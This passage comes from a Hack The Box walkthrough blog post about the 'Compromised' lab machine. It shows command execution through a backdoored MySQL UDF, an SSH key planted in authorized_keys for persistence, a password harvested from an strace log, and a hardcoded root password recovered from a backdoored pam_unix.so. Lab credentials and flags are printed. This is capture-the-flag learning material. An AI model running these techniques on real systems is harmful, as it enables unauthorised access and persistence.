+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash</span><br><span class="line">mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash</span><br><span class="line">red:x:1001:1001::/home/red:/bin/false</span><br></pre></td></tr></table></figure>
+
+<p>hmm, boxname is “Compromised” and we get mysql creds and mysql has &#x2F;bin&#x2F;bash in &#x2F;etc&#x2F;passwd…<br>google “mysql backdoor”…<br>hmm we find out, that User Defined Functions (UDF) can be used,<br>so lets look at udf in our pseudoshell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; mysql -u root -pchangethis -e <span class="string">&quot;select * from mysql.func;&quot;</span></span><br><span class="line">name    ret     dl      <span class="built_in">type</span></span><br><span class="line">exec_cmd        0       libmysql.so     <span class="keyword">function</span></span><br></pre></td></tr></table></figure>
+
+<p>alright we found the udf called “exec_cmd”<br>lets try executing a simple command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; mysql -u root -pchangethis -e <span class="string">&quot;select exec_cmd(&#x27;id&#x27;)&quot;</span></span><br><span class="line">exec_cmd(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=111(mysql) gid=113(mysql) <span class="built_in">groups</span>=113(mysql)\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><br></pre></td></tr></table></figure>
+
+<p>what we can do now: add our public key to authorized keys:<br>first create a public and private key on your kali machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># ssh-keygen -t ed25519 -f ./key</span></span><br><span class="line">Generating public/private ed25519 key pair.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> ./key</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> ./key.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:HPqYLVvu3/R18DoJNMmkbT4wlENJ63Smbx3EkqNBu5g root@kali</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+--[ED25519 256]--+</span></span><br><span class="line"><span class="string">|         o+o     |</span></span><br><span class="line"><span class="string">|         .=o.o   |</span></span><br><span class="line"><span class="string">|        ..=**.o  |</span></span><br><span class="line"><span class="string">|       o *+BB+   |</span></span><br><span class="line"><span class="string">|      . E =* .o  |</span></span><br><span class="line"><span class="string">|       =   .+. + |</span></span><br><span class="line"><span class="string">|      + +   +o..+|</span></span><br><span class="line"><span class="string">|       =   + .oo.|</span></span><br><span class="line"><span class="string">|      ..o.. . o. |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">root@kali:~/hackthebox/machine/compromised# cat key</span></span><br><span class="line"><span class="string">-----BEGIN OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span></span><br><span class="line"><span class="string">QyNTUxOQAAACD9+JBVupuMTJ87k29H8HBXCEQC/zi59/mR8K+K+S527AAAAJAmEMXWJhDF</span></span><br><span class="line"><span class="string">1gAAAAtzc2gtZWQyNTUxOQAAACD9+JBVupuMTJ87k29H8HBXCEQC/zi59/mR8K+K+S527A</span></span><br><span class="line"><span class="string">AAAEC6pQZXCMMauEJqmB51/2UgSeuo1GzOnsO3S05SENXJa/34kFW6m4xMnzuTb0fwcFcI</span></span><br><span class="line"><span class="string">RAL/OLn3+ZHwr4r5LnbsAAAACXJvb3RAa2FsaQECAwQ=</span></span><br><span class="line"><span class="string">-----END OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">root@kali:~/hackthebox/machine/compromised# ls</span></span><br><span class="line"><span class="string">45267.py  a.tar.gz  bypass.php  exp.py  key  key.pub  pshell.sh  shop</span></span><br><span class="line"><span class="string">root@kali:~/hackthebox/machine/compromised# cat key.pub </span></span><br><span class="line"><span class="string">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP34kFW6m4xMnzuTb0fwcFcIRAL/OLn3+ZHwr4r5Lnbs root@kali</span></span><br></pre></td></tr></table></figure>
+
+<p>now copy the contents of key.pub and put it in the authorized keys of mysql account with the pseudoshell you have:<br>of course replace it with your public key, that you copied…</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -pchangethis -e <span class="string">&quot;select exec_cmd(&#x27;mkdir /var/lib/mysql/.ssh&#x27;)&quot;</span></span><br><span class="line">mysql -u root -pchangethis -e <span class="string">&quot;select exec_cmd(&#x27;echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP34kFW6m4xMnzuTb0fwcFcIRAL/OLn3+ZHwr4r5Lnbs root@kali &gt; /var/lib/mysql/.ssh/authorized_keys&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>ssh into the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># ssh -i key mysql@10.10.10.207</span></span><br><span class="line">Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2</span><br><span class="line">mysql@compromised:~$ <span class="built_in">id</span></span><br><span class="line">uid=111(mysql) gid=113(mysql) <span class="built_in">groups</span>=113(mysql)</span><br><span class="line">mysql@compromised:~$ <span class="built_in">whoami</span></span><br><span class="line">mysql</span><br></pre></td></tr></table></figure>
+
+<p>enumerate the home folder:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql@compromised:~$ grep -nrli sysadmin</span><br><span class="line">strace-log.dat</span><br><span class="line">mysql@compromised:~$ <span class="built_in">cat</span> strace-log.dat | grep password</span><br><span class="line">22102 03:11:06 write(2, <span class="string">&quot;mysql -u root --password=&#x27;3*NLJE&quot;</span>..., 39) = 39</span><br><span class="line">22227 03:11:09 execve(<span class="string">&quot;/usr/bin/mysql&quot;</span>, [<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;--password=3*NLJE32I<span class="variable">$Fe</span>&quot;</span>], 0x55bc62467900 /* 21 vars */) = 0</span><br><span class="line">22227 03:11:09 write(2, <span class="string">&quot;[Warning] Using a password on th&quot;</span>..., 73) = 73</span><br><span class="line">22102 03:11:10 write(2, <span class="string">&quot;mysql -u root --password=&#x27;3*NLJE&quot;</span>..., 39) = 39</span><br><span class="line">22228 03:11:15 execve(<span class="string">&quot;/usr/bin/mysql&quot;</span>, [<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;--password=changeme&quot;</span>], 0x55bc62467900 /* 21 vars */) = 0</span><br><span class="line">22228 03:11:15 write(2, <span class="string">&quot;[Warning] Using a password on th&quot;</span>..., 73) = 73</span><br><span class="line">22102 03:11:16 write(2, <span class="string">&quot;mysql -u root --password=&#x27;change&quot;</span>..., 35) = 35</span><br><span class="line">22229 03:11:18 execve(<span class="string">&quot;/usr/bin/mysql&quot;</span>, [<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;--password=changethis&quot;</span>], 0x55bc62467900 /* 21 vars */) = 0</span><br><span class="line">22229 03:11:18 write(2, <span class="string">&quot;[Warning] Using a password on th&quot;</span>..., 73) = 73</span><br><span class="line">22232 03:11:52 openat(AT_FDCWD, <span class="string">&quot;/etc/pam.d/common-password&quot;</span>, O_RDONLY) = 5</span><br><span class="line">22232 03:11:52 <span class="built_in">read</span>(5, <span class="string">&quot;#\n# /etc/pam.d/common-password -&quot;</span>..., 4096) = 1440</span><br><span class="line">22232 03:11:52 write(4, <span class="string">&quot;[sudo] password for sysadmin: &quot;</span>, 30) = 30</span><br></pre></td></tr></table></figure>
+
+<p>we find the password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;--password=3*NLJE32I<span class="variable">$Fe</span>&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>now change to sysadmin user with the password &#x3D; 3*NLJE32I$Fe<br>and also get the user.txt :) :) :)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql@compromised:~$ su sysadmin</span><br><span class="line">Password: </span><br><span class="line">sysadmin@compromised:/var/lib/mysql$ <span class="built_in">cd</span></span><br><span class="line">sysadmin@compromised:~$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">sysadmin@compromised:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">9b8e8c9f70062d3e9889e214fe7ccdb9</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb93.jpg"></li>
+</ul>
+<h3 id="privilege-esclation"><a href="#privilege-esclation" class="headerlink" title="privilege esclation"></a>privilege esclation</h3><p>now look at the modified files between 14.07 and today:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sysadmin@compromised:~$ find / -newermt <span class="string">&quot;2020-07-14&quot;</span> ! -newermt <span class="string">&quot;2020-09-16&quot;</span> -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">/etc/ld.so.cache</span><br><span class="line">/etc/fstab</span><br><span class="line">/etc/ufw/ufw.conf</span><br><span class="line">/etc/ufw/user.rules</span><br><span class="line">/etc/ufw/user6.rules</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line">/etc/network/interfaces</span><br><span class="line">/lib/x86_64-linux-gnu/security/.pam_unix.so</span><br><span class="line">/lib/x86_64-linux-gnu/security/pam_unix.so</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;security&#x2F;pam_unix.so is strange…<br>why is there a &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;security&#x2F;.pam_unix.so?<br>maybe another backdoor in pam and &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;security&#x2F;.pam_unix.so is a backup?<br>lets look at it in a reversing program (i will use ghidra).<br>first download the pam_unix.so to our kali machine with scp:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># scp sysadmin@10.10.10.207:/lib/x86_64-linux-gnu/security/pam_unix.so ./pam_unix.so</span></span><br><span class="line">sysadmin@10.10.10.207<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">pam_unix.so</span></span><br><span class="line"><span class="string">#password = 3*NLJE32I$Fe</span></span><br></pre></td></tr></table></figure>
+
+<p>looking at the functions, find the important authenticate function<br>and in there we find the string backdoor.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb94.jpg"></li>
+</ul>
+<p>this means, if our password matches the backdoor string, we can get root.<br>now lets reverse the backdoor string.<br>On the Listing window we can just rightclick the value and click on convert -&gt; Char Sequence</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb95.jpg"></li>
+</ul>
+<p>then we got two separated strings, combine them together</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RAX,<span class="string">&quot;zlke~U3E&quot;</span> + RAX,<span class="string">&quot;nv82m2-\x00&quot;</span></span><br><span class="line"></span><br><span class="line">result: zlke~U3Env82m2-</span><br></pre></td></tr></table></figure>
+
+<p>this gives us the the password: zlke~U3Env82m2-<br>we can change to root with this, and get root flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sysadmin@compromised:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@compromised:/home/sysadmin<span class="comment"># cd</span></span><br><span class="line">root@compromised:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@compromised:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@compromised:~<span class="comment"># cat root.txt</span></span><br><span class="line">7017dc92e57aa31b32d755a062da5d8f</span><br><span class="line"><span class="comment"># password = zlke~U3Env82m2-</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb96.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb97.jpg"></p>
+</li>
+</ul>
+<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
+<li>Source code leaked admin password</li>
+<li>LiteCart 2.1.2 - Arbitrary File Upload  </li>
+<li>change python exp script</li>
+<li>php disable_functions bypass with PHP 7.0-7.3 disable_functions bypass PoC</li>
+<li>bash shell script</li>
+<li>ssh generate to get mysql shell</li>
+<li>mysql User Defined Functions (UDF) commands excecution</li>
+<li>home folder passwords leaked</li>
+<li>use ghidra to reverse pam_unix.so file find backdoor string to get password</li>
+</ul>
+<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/09/16/compromised/" title="Hack-The-Box-walkthrough[compromised]">https://fdlucifer.github.io/2020/09/16/compromised/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/09/07/passage/" rel="prev" title="Hack-The-Box-walkthrough[passage]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[passage]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/09/17/unserialize/" rel="next" title="几道php反序列化解题记录">
+                  几道php反序列化解题记录 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
